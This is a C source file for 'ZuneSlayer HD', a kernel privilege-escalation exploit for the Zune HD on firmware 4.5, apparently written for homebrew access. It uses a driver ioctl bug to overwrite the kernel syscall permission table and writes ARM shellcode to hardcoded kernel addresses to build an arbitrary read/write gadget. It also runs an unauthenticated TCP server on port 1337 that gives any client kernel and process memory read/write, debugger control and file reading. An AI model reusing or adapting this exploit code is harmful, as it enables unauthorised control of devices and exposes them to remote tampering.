/* 
	ZuneSlayer HD

	Kernel Exploit for Zune HD (pavo) (offsets specific to fw v4.5)

	Shy Bairns Get Nowt
 */

#include <windows.h>
#include <zdk.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <psapi.h>
#include "xutility.h"

#include "wasm.h"

#include <assert.h>
#include <compclient.h>
#include <float.h>
#include <math.h>
#include <stdio.h>
#include <windows.h>
#include <zdkinput.h>
#include <zdkgl.h>
#include <zdksystem.h>
#include <zdknet.h>
#include <zam.h>
#include <znet.h>
#include <wininet.h>
#include <winsock2.h>
#include <wininet.h>
#include <Iphlpapi.h>
#include <winsock2.h>
#include "protocol/pb_encode.h"
#include "protocol/pb_decode.h"
#include "protocol/msg.pb.h"

wchar_t foo[256];

typedef unsigned int u32;
typedef unsigned short u16;

typedef DWORD (*KFSH)(DWORD, DWORD, DWORD);
typedef HANDLE (*FFS)(void*);
typedef BOOL (*VCE)(DWORD, void*, HANDLE, DWORD, DWORD, DWORD);
typedef void* (*CSM)(DWORD, DWORD);

DWORD WINAPI thread_exit_with_value(void* x) {
	while(1) {
		ExitThread((DWORD)x);
	}
	return 0;
}

// Write `val` to `kptr`
static void kwr(DWORD kptr, DWORD val) {
	HANDLE t = CreateThread(NULL, 0, thread_exit_with_value, (void*)val, 0, NULL);
	Sleep(200);
	BOOL b = GetExitCodeThread(t, (DWORD*)kptr);
	
}

// Read byte from `kptr`
static DWORD kreadb(DWORD kptr) {
	HMODULE mh = GetModuleHandleW(L"coredll.dll");
	KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");
	DWORD hi = ghi(kptr, 0, 0x1338);
	return hi;
}
static u32 kreadu32(u32 kptr) {
	u32 d = kreadb(kptr);
	u32 c = kreadb(kptr+1);
	u32 b = kreadb(kptr+2);
	u32 a = kreadb(kptr+3);
	return (a << 24) | (b << 16) | (c << 8) | d;
}
u16 kreadu16(u32 kptr) {
	u32 d = kreadb(kptr);
	u32 c = kreadb(kptr+1);
	return (c << 8) | d;
}

// Write byte `val` to `kptr`
static void kwriteb(DWORD kptr, BYTE val) {
	HMODULE mh = GetModuleHandleW(L"coredll.dll");
	KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");
	ghi(kptr, (DWORD)val, 0x1337);
}

void kmemcpy(DWORD kptr, BYTE* buf, size_t len) {
	HMODULE mh = GetModuleHandleW(L"coredll.dll");
	KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");
	for(size_t i = 0; i < len; i++) {
		ghi(kptr+i, (DWORD)buf[i], 0x1337);
	}
}

static bool dead = false;

static int safe_send(SOCKET client, unsigned char* out, uint32_t count) {
	uint32_t off = 0;
	int rem = count;
	while(true) {
		int send_res = send(client,(char*)&out[off], rem, 0);
		if(send_res == SOCKET_ERROR) {
			return 1;
		}
		rem -= send_res;
		off += send_res;
		if(rem <= 0) {
			return 0;
		}
		Sleep(100);
	}
}

#define INBUFSZ 1024
#define OBUFSZ 0x10000
#define RDFILESZ 0x400

static zunecom_CommandResp resp = zunecom_CommandResp_init_zero;

static LPCWSTR getIpAddress(){
	MIB_IPADDRTABLE  *pIPAddrTable;
	DWORD            dwSize = 0;
	DWORD            dwRetVal;
	pIPAddrTable = (MIB_IPADDRTABLE*) malloc( sizeof(MIB_IPADDRTABLE) );
	LPCWSTR result = TEXT("Starting...");

	// Retrieving struct size
	if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER) {
		free( pIPAddrTable );
		pIPAddrTable = (MIB_IPADDRTABLE *) malloc ( dwSize );
	}

	if ( (dwRetVal = GetIpAddrTable( pIPAddrTable, &dwSize, 0 )) != NO_ERROR ) { 
		result=TEXT("GetIpAddrTable call failed.");
	}else{
		 char buffer [50];
		 in_addr me;
		 me.S_un.S_addr = pIPAddrTable->table[0].dwAddr;
		 sprintf (buffer, "CodePug WebServer Started.\nhttp://%s\n", inet_ntoa(me));
		 result = MultiCharToUniChar(buffer);
	}
	free(pIPAddrTable);
	return result;
}

void connection(SOCKET client) {
	unsigned char* inbuf = (unsigned char*)calloc(INBUFSZ, 1);
	unsigned char* out = (unsigned char*)calloc(OBUFSZ, 1);

		char* c = "Hello\n";
		if (send(client,c,strlen(c),0) == SOCKET_ERROR){
			closesocket(client);
			return;
		}

		while(true) {
			memset(out, 0, OBUFSZ);
			

			int res = recv(client,(char*)inbuf,INBUFSZ,0);

			if (res == SOCKET_ERROR){
				closesocket(client);
				return;
			}

			// read
			if(inbuf[0] == 1) {
				u32 addr = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));

				u32 val = kreadu32(addr);

				
				out[0] = 1;
				out[1] = val & 0xFF;
				out[2] = (val >> 8) & 0xFF;
				out[3] = (val >> 16) & 0xFF;
				out[4] = (val >> 24) & 0xFF;
				
				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
			// openproc
			} else if (inbuf[0] == 2) {
				u32 id = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 val = (u32)OpenProcess(PROCESS_ALL_ACCESS, false, id);
				out[0] = 2;
				out[1] = val & 0xFF;
				out[2] = (val >> 8) & 0xFF;
				out[3] = (val >> 16) & 0xFF;
				out[4] = (val >> 24) & 0xFF;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
				//rd
			} else if (inbuf[0] == 3) {
				u32 hdl = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 addr = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
				
				DWORD val=0;
				DWORD tmp=0;
				BOOL ret = ReadProcessMemory((HANDLE)hdl, (void*)addr, &tmp, 4, &val);
				DWORD err = GetLastError();

				out[0] = 3;
				out[1] = tmp & 0xFF;
				out[2] = (tmp >> 8) & 0xFF;
				out[3] = (tmp >> 16) & 0xFF;
				out[4] = (tmp >> 24) & 0xFF;
				out[5] = val & 0xFF;
				out[6] = (val>> 8) & 0xFF;
				out[7] = (val >> 16) & 0xFF;
				out[8] = (val >> 24) & 0xFF;
				out[9] = (ret) & 0xFF;
				out[10] = err & 0xFF;
				out[11] = (err>> 8) & 0xFF;
				out[12] = (err >> 16) & 0xFF;
				out[13] = (err >> 24) & 0xFF;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}

				// proc w
} else if (inbuf[0] == 4) {
				u32 hdl = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 addr = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
				u32 val = ((u32)inbuf[9]) | ((u32)(inbuf[10] << 8)) | ((u32)(inbuf[11] << 16)) | ((u32)(inbuf[12] << 24));
				
				DWORD tmp=0;
				
				BOOL ret = WriteProcessMemory((HANDLE)hdl, (void*)addr, &val, 4, &tmp);
				DWORD err = GetLastError();

				out[0] = 4;
				out[1] = tmp & 0xFF;
				out[2] = (tmp >> 8) & 0xFF;
				out[3] = (tmp >> 16) & 0xFF;
				out[4] = (tmp >> 24) & 0xFF;
				out[5] = (ret) & 0xFF;
				out[6] = err & 0xFF;
				out[7] = (err>> 8) & 0xFF;
				out[8] = (err >> 16) & 0xFF;
				out[9] = (err >> 24) & 0xFF;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}

			} else if (inbuf[0] == 5) {
				u32 id = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				BOOL val = DebugActiveProcess(id);

				out[0] = 5;
				out[1] = val & 0xFF;
				out[2] = (val >> 8) & 0xFF;
				out[3] = (val >> 16) & 0xFF;
				out[4] = (val >> 24) & 0xFF;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}

} else if (inbuf[0] == 6) {
				DEBUG_EVENT evt;
				BOOL val = WaitForDebugEvent(&evt, 0);

				u32 tmp = evt.dwDebugEventCode;

				out[0] = 6;
				out[1] = val & 0xFF;
				out[2] = (val >> 8) & 0xFF;
				out[3] = (val >> 16) & 0xFF;
				out[4] = (val >> 24) & 0xFF;
				out[5] = tmp & 0xFF;
				out[6] = (tmp >> 8) & 0xFF;
				out[7] = (tmp >> 16) & 0xFF;
				out[8] = (tmp >> 24) & 0xFF;

				u32 tmp1=0;

				if(val) {

					tmp1 = evt.dwProcessId;
					out[9] = tmp1 & 0xFF;
					out[10] = (tmp1 >> 8) & 0xFF;
					out[11] = (tmp1 >> 16) & 0xFF;
					out[12] = (tmp1 >> 24) & 0xFF;
					
					tmp1 = evt.dwThreadId;
					out[13] = tmp1 & 0xFF;
					out[14] = (tmp1 >> 8) & 0xFF;
					out[15] = (tmp1 >> 16) & 0xFF;
					out[16] = (tmp1 >> 24) & 0xFF;


					switch (tmp) {
						case EXCEPTION_DEBUG_EVENT:							
							tmp1 = evt.u.Exception.ExceptionRecord.ExceptionCode;
							out[17] = tmp1 & 0xFF;
							out[18] = (tmp1 >> 8) & 0xFF;
							out[19] = (tmp1 >> 16) & 0xFF;
							out[20] = (tmp1 >> 24) & 0xFF;

							break;
						//default:
						//	ContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE);
					}
				}



				

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
} else if (inbuf[0] == 7) {
				u32 dwProcessId = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 dwThreadId = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
				
				ContinueDebugEvent(dwProcessId, dwThreadId, DBG_CONTINUE);

				out[0] = 7;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
} else if (inbuf[0] == 8) {
				u32 dwThreadId = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
			//	u32 dwThreadId = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
							
				CONTEXT ctx = {0};
				ctx.ContextFlags = CONTEXT_FULL;
				HANDLE h = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, false, dwThreadId);
				GetThreadContext(h, &ctx);

				int i = 0;
				out[i++] = 8;
				u32 val = ctx.R0;
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.R1;
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.R2;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.R3;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.Pc;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.Lr;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.Sp;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;

				CloseHandle(h);
				

				if (send(client,(char*)out,64,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}


				// quit
			} else if (inbuf[0] == 10) {
				out[0] = 10;
				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					closesocket(client);
					break;
				}
				closesocket(client);
				// kill
			} else if (inbuf[0] == 11) {
				out[0] = 10;
				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					closesocket(client);
				}
				closesocket(client);
				dead = true;
				break;

/*} else if (inbuf[0] == 12) {
				u32 id = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				BOOL val = TerminateProcess((HANDLE)id, 0);

				out[0] = 12;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}*/
/*} else if (inbuf[0] == 13) {
				u32 idx = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 idx2 = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));

WIN32_FIND_DATA ffd;
   HANDLE hFind = INVALID_HANDLE_VALUE;
   BOOL r=1;

      hFind = FindFirstFile(paths[idx2], &ffd);

if (INVALID_HANDLE_VALUE == hFind) 
   {
	   ZDKSystem_ShowMessageBox(L"BAD", MESSAGEBOX_TYPE_OK);
      //return;
   } 

for(u32 i =0; i <idx; i++) {
	  r = FindNextFile(hFind, &ffd);
	  if (r == 0) {break;}
}
	  std::swprintf(foo, L"test %s r: %d", ffd.cFileName, r);
//ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);


				out[0] = 13;
				memcpy(&out[1], foo, 256*2);

				if (send(client,(char*)out,512,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
*/
/*} else if (inbuf[0] == 14) {
				u32 idx = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
u32 idx2 = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));

WIN32_FIND_DATA ffd;
   HANDLE hFind = INVALID_HANDLE_VALUE;
   BOOL r=1;

      hFind = FindFirstFile(paths[idx2], &ffd);

if (INVALID_HANDLE_VALUE == hFind) 
   {
	   ZDKSystem_ShowMessageBox(L"BAD", MESSAGEBOX_TYPE_OK);
      //return;
   } 

for(u32 i =0; i <idx; i++) {
	  r = FindNextFile(hFind, &ffd);
	  if (r == 0) {break;}
}
	  std::swprintf(foo, L"%s\\%s", paths2[idx2], ffd.cFileName);
	  HANDLE f = CreateFileW(foo, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	  char* buf = (char*)calloc(SZSZSZ, 1);
	  DWORD cnt = 0;
	  ReadFile(f, &buf[4], SZSZSZ-4, &cnt, NULL);
	  CloseHandle(f);
	  int j = 0;
		buf[j++] =  cnt & 0xFF;
		buf[j++] = (cnt >> 8) & 0xFF;
		buf[j++] = (cnt >> 16) & 0xFF;
		buf[j++] = (cnt >> 24) & 0xFF;

				if (send(client,(char*)buf,SZSZSZ,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
				free(buf);
				*/
} else if (inbuf[0] == 15) {
u32 idx = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
u32 idx2 = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
u32 val = ((u32)inbuf[9]) | ((u32)(inbuf[10] << 8)) | ((u32)(inbuf[11] << 16)) | ((u32)(inbuf[12] << 24));
	
				//char* out = (char*)calloc(cccc, 4);
				#if 1
					kwr(0x80060da0, 0x80069de0);

					HMODULE mh = GetModuleHandleW(L"coredll.dll");
					//NKCreateStaticMapping
					CSM csm = (CSM) GetProcAddress(mh, L"GetFSHeapInfo");

					SetLastError(0);
					//void* ahb_arb = csm(0x6000c000, 0x1000);
					//void* boorom = csm(0xFFF00000>>8, 0x10000);
					//void* boorom1 = csm(0xFFF02000>>8, 0x10000);

					DWORD sec_boot = (DWORD)csm(0x60000000>>8, 0x1000);
					kwr(sec_boot+0xc200, 1);


					DWORD clk = (DWORD)csm(0x60006000>>8, 0x1000);

					// enable iram{a,b,c,d}
					DWORD clk_rst_controller_clk_out_enb_u_0 = kreadu32(clk + 0x18);
					clk_rst_controller_clk_out_enb_u_0 |= (1<<20);
					clk_rst_controller_clk_out_enb_u_0 |= (1<<21);
					clk_rst_controller_clk_out_enb_u_0 |= (1<<22);
					clk_rst_controller_clk_out_enb_u_0 |= (1<<23);
					kwr(clk+0x18, clk_rst_controller_clk_out_enb_u_0);



					//void* f = csm(0x40000000>>8, 0x10000);

					void* f = (void*)sec_boot;//csm(idx>>8, val);

					kwr(0x80060da0, 0x80015020);
					
			
					KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");

					for(u32 j=idx2;j<val;j++) {
						char out[1];
						out[0] = (char)ghi((DWORD)f + j, 0, 0x1338);
						if (send(client,(char*)out,1,0) == SOCKET_ERROR){
							closesocket(client);
							break;
						}
						//Sleep(100);
					}
				#endif
} else if (inbuf[0] == 16) {
	zunecom_CommandReq msg = zunecom_CommandReq_init_zero;
	pb_istream_t pbstream = pb_istream_from_buffer(&inbuf[1], res-1);
	if(!pb_decode(&pbstream, zunecom_CommandReq_fields, &msg)) {
		memset(out, 0, 128);
		memset(foo, 0, 128);
		send(client,(char*)PB_GET_ERROR(&pbstream),128,0);

		std::swprintf(foo, L" pb err: %S r: %d", PB_GET_ERROR(&pbstream), res-1);
		memcpy(out, foo, 128);
		out[0] = 0xCD;

		if (safe_send(client,(unsigned char*)out, 128)){
			closesocket(client);
			break;
		}
		continue;
	}
	pb_ostream_t ostream = pb_ostream_from_buffer(out, OBUFSZ);
	

	WIN32_FIND_DATA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    BOOL r=1;
	char tmpbuf[200];

	switch(msg.cmd) {
		case zunecom_CommandReq_CommandType_CMD_LSDIR:
		{


		
		resp.cmd = zunecom_CommandResp_ResType_RSP_LSDIR;
		resp.which_payload = zunecom_CommandResp_lsdir_tag;

		memset(foo, 0, 256);
		std::swprintf(foo, L"%S", msg.payload.lsdir.path);


		hFind = FindFirstFile(foo, &ffd);

		if (INVALID_HANDLE_VALUE == hFind) {
			memset(out, 0, 128);
			out[0] = 0xCE;
			memcpy(&out[2], foo, 256);


			if (safe_send(client,(unsigned char*)out, 256)){
				closesocket(client);
				break;
			}
		  break;
		} 
#define ZUNECOM_PATH_LEN 270
		#define ZUNECOM_PATH_CNT 270

		resp.payload.lsdir.path_count = 0;

		wcstombs(tmpbuf, ffd.cFileName, ZUNECOM_PATH_LEN-2);
		strncpy(resp.payload.lsdir.path[resp.payload.lsdir.path_count].path, tmpbuf, ZUNECOM_PATH_LEN-2);
		if(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			resp.payload.lsdir.path[resp.payload.lsdir.path_count].is_dir = true;
		 } else {
			resp.payload.lsdir.path[resp.payload.lsdir.path_count].is_dir = false;
		 }
		resp.payload.lsdir.path_count++;

		for(; resp.payload.lsdir.path_count < ZUNECOM_PATH_CNT-2;) {
			  r = FindNextFile(hFind, &ffd);
			  if (r == 0) {break;}
			  wcstombs(tmpbuf, ffd.cFileName, ZUNECOM_PATH_LEN-2);
			  strncpy(resp.payload.lsdir.path[resp.payload.lsdir.path_count].path, tmpbuf, ZUNECOM_PATH_LEN-2);
			 
			  if(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				  resp.payload.lsdir.path[resp.payload.lsdir.path_count].is_dir = true;
			  } else {
				  resp.payload.lsdir.path[resp.payload.lsdir.path_count].is_dir = false;
			  }

			  resp.payload.lsdir.path_count++;
		}

	
	if(!pb_encode(&ostream, zunecom_CommandResp_fields, &resp)) {
		memset(out, 0, 128);
		memset(foo, 0, 128);
		//send(client,(char*)PB_GET_ERROR(&pbstream),256,0);

		std::swprintf(foo, L"pb err: '%S' pc:%d", PB_GET_ERROR(&pbstream), resp.payload.lsdir.path_count);
		memcpy(out, foo, 256);
		out[0] = 0xCF;
		if (safe_send(client,(unsigned char*)out, 256)) { closesocket(client); break; }
	} else {
		if(safe_send(client, (unsigned char*) out, ostream.bytes_written)) {
			closesocket(client);
			break;
		}
	}

	}
	break;

		case zunecom_CommandReq_CommandType_CMD_RDFILE:
			{
				

				std::swprintf(foo, L"%S", msg.payload.rdfile.path);
				HANDLE f = CreateFileW(foo, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

				DWORD hFz = 0;
				DWORD lowfz = GetFileSize(f, &hFz);

			  
			  DWORD cnt = 0;
			  while(true) {
				cnt = 0;

				resp.cmd = zunecom_CommandResp_ResType_RSP_RDFILE_DATA;
				resp.which_payload = zunecom_CommandResp_rdfile_tag;

				r = ReadFile(f, &resp.payload.rdfile.data.bytes[0], RDFILESZ-50, &cnt, NULL);
				resp.payload.rdfile.data.size = cnt;
				resp.payload.rdfile.fullsz = lowfz;
				if(cnt == 0) {
					break;
				}

				ostream = pb_ostream_from_buffer(out, OBUFSZ);

				if(!pb_encode(&ostream, zunecom_CommandResp_fields, &resp)) {
					memset(out, 0, 128);
					std::swprintf(foo, L"pb err: %S", PB_GET_ERROR(&pbstream));
					memcpy(out, foo, 128);
					out[0] = 0xDF;

					if (safe_send(client,(unsigned char*)out, 128)){
						closesocket(client);
						break;
					}
				}
				if (safe_send(client,(unsigned char*)out, ostream.bytes_written)){
					closesocket(client);
					break;
				}
				Sleep(100);

			  }
			  CloseHandle(f);

				resp.cmd = zunecom_CommandResp_ResType_RSP_RDFILE_EOF;
				resp.which_payload = zunecom_CommandResp_eof_tag;
				
				ostream = pb_ostream_from_buffer(out, OBUFSZ);

				if(!pb_encode(&ostream, zunecom_CommandResp_fields, &resp)) {
					memset(out, 0, 128);
					std::swprintf(foo, L"pb err: %S", PB_GET_ERROR(&pbstream));
					memcpy(out, foo, 128);
					out[0] = 0xDE;

					if (safe_send(client,(unsigned char*)out, 128)){
						closesocket(client);
						break;
					}
				}

				if (safe_send(client, (unsigned char*)out, ostream.bytes_written)){
					closesocket(client);
					break;
				}
			}
			break;
	 

	default:
		out[0] = 0xFF;
		if (safe_send(client,(unsigned char*)out, 32)){
			closesocket(client);
			break;
		}
		break;
}


			} else {
				out[0] = 0xFF;
				if (safe_send(client,(unsigned char*)out, 32)){
					closesocket(client);
					break;
				}
			}
		}

}

DWORD Server(void* sd_) {
		SOCKADDR_IN addr;
		SOCKET client;
		SOCKET sd;

		addr.sin_family = AF_INET;
		addr.sin_port = htons (1337);
		addr.sin_addr.s_addr = htonl (INADDR_ANY);
		

		// Create Socket
		if((sd = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET) {
			ZDKSystem_ShowMessageBox(L"Sock fail", MESSAGEBOX_TYPE_OK);
			return 0;
		}

		if (bind(sd, (LPSOCKADDR)&addr, sizeof(addr)) == SOCKET_ERROR) {
			ZDKSystem_ShowMessageBox(L"Bind fail", MESSAGEBOX_TYPE_OK);
			return 0;
		}

		if (listen(sd,5) == SOCKET_ERROR) {
			ZDKSystem_ShowMessageBox(L"listen fail", MESSAGEBOX_TYPE_OK);
			return 0;
		}


	if (sd == INVALID_SOCKET)
		return 0;

	ZDKSystem_ShowMessageBox(getIpAddress(), MESSAGEBOX_TYPE_OK);
	while(!dead) {
		client = accept(sd,NULL,NULL);


		connection(client);
	}

    return 1;
}


static int hax_30() {
	BOOL b = false;
	HANDLE h;
	DWORD outsz = 0;
	void* outb = calloc(1024, 1);

	int tgt_val = 0;
	int tgt_addr = 0x80000000;

	h = CreateFileW(L"WAV1:", GENERIC_READ, 0, 0,3, 0x80, 0);
#pragma pack(push,1)
		struct Input{
		int idk;
		int cmd;
		void* d;
		int b;
		int c;
	};
	#pragma pack(pop)
		struct Input* inbuf = (struct Input*)calloc(sizeof(Input), 1);
		inbuf->cmd = 0x11;
		inbuf->b = tgt_val;
		inbuf->d = NULL;
	b = DeviceIoControl(h, /*cmd*/0x1d000c, inbuf, sizeof(Input), /* outb, != null */ outb, /* outs, >3 */ 1024, &outsz, NULL);
	if(b != 0) {
		inbuf->cmd = 0x10;
		inbuf->b = tgt_addr;
		inbuf->d = NULL;
		b = DeviceIoControl(h, /*cmd*/0x1d000c, inbuf, sizeof(Input), /* outb, != null */ outb, /* outs, >3 */ 1024, &outsz, NULL);
	}

	free(outb);
	return 0;
}

int hax() {
	DWORD o = 0;
	BOOL b = false;
	HANDLE h;
	DWORD outsz = 0;


	/* Step 1: Use bug in libnmvwavedev.dll to write controled value over the syscall parameter validation table */
	h = CreateFileW(L"WAV1:", GENERIC_READ, 0, 0,3, 0x80, 0);
	#pragma pack(push,1)
		struct Input{
		int ptr_idx;
		int subcmd;
		int a;
		int b;
		int c;
	};
	#pragma pack(pop)

	DWORD get_exit_code_thread_ptr = 0x80061408;

	struct Input* inbuf = (struct Input*)calloc(sizeof(Input), 1);
	void* outb = calloc(1024, 1);
	inbuf->subcmd = 0x13; // 7 => |= 2, 8 => unset bit 2
	inbuf->a = get_exit_code_thread_ptr - 0x178; // addr of perms for GetExitCodeThread - offset
	inbuf->b = 0; // tgt value

	b = DeviceIoControl(h, /*cmd*/0x1d000c, inbuf, sizeof(Input), /* outb, != null */ outb, /* outs, >3 */ 1024, &outsz, NULL);
	if(b != 0) {
		//std::swprintf(foo, L"gud ioctl: %x %x", *((int*)outb), *((int*)outb + 4));
		//ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
	} else {
		DWORD err = GetLastError();
		std::swprintf(foo, L"bad ioctl: %x", err);
		ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
		return 0;
	}
	free(inbuf);

	/* We can now use kernel pointers as outputs for GetExitCodeThread */

	/* Step 2: Create a arb r/w gadget */
	DWORD base = 0x80015020;

	/*
ldr r3, =0x1337
cmp r2, r3
bne not_store
strb r1, [r0]
b ret
not_store:
add r3, #1
cmp r2, r3
bne err
ldrb r0, [r0]
ret:
bx lr

err:
ldr r0, =0x80072360
bx r0


\x28\x30\x9f\xe5
\x03\x00\x52\xe1
\x01\x00\x00\x1a
\x00\x10\xc0\xe5

\x03\x00\x00\xea
\x01\x30\x83\xe2
\x03\x00\x52\xe1
\x01\x00\x00\x1a

\x00\x00\xd0\xe5
\x1e\xff\x2f\xe1
\x04\x00\x9f\xe5
\x10\xff\x2f\xe1

\x37\x13\x00\x00
\x60\x23\x07\x80"

	*/
	kwr(base+0x00, 0xe59f3028);
    kwr(base+0x04, 0xe1520003);
	kwr(base+0x08, 0x1a000001);
	kwr(base+0x0c, 0xe5c01000);

	kwr(base+0x10, 0xea000003);
	kwr(base+0x14, 0xe2833001);
	kwr(base+0x18, 0xe1520003);
	kwr(base+0x1c, 0x1a000001);

	kwr(base+0x20, 0xe5d00000);
	kwr(base+0x24, 0xe12fff1e);
	kwr(base+0x28, 0xe59f0004);
	kwr(base+0x2c, 0xe12fff10);

	kwr(base+0x30, 0x00001337);
	kwr(base+0x34, 0x80072360);

	/*
	; write gadget
	strb r0, [r0]
	bx lr
	;"\x00\x00\xc0\xe5 \x1e\xff\x2f\xe1"
	
	kwr(base+0x8, 0xe5c00000);
    kwr(base+0xc, 0xe12fff1e);*/

	/* Step 3: make getfsheapinfo into arb r/w gadget we just made (normally not usable as untrusted) */
	kwr(0x80060da0, base);
	
	/* Step 4: allow access to VirtualCopyEx for untrusted via GetRomFileInfo */
	//kwr(0x80060d98, 0x8006c140);
	/* Step 4: allow access to CreateStaticMapping for untrusted via GetRomFileInfo */
	//kwr(0x80060d98, 0x80069de0);

/*!!!!!!!!!!!!!!!!!!!!!! GetRomFileInfo was problen */



	//fuck
	// kwr(0x8006c1b4, 0xea0018e8); //
    //kwr(0x800698b4, 0xea002328); // vmcpy pf = h
	//kwr(0x800698c8, 0xea002323); // did vmcpy phy f?  
   //kwr(0x80065bac, 0xea00326a); // ivp f = nh
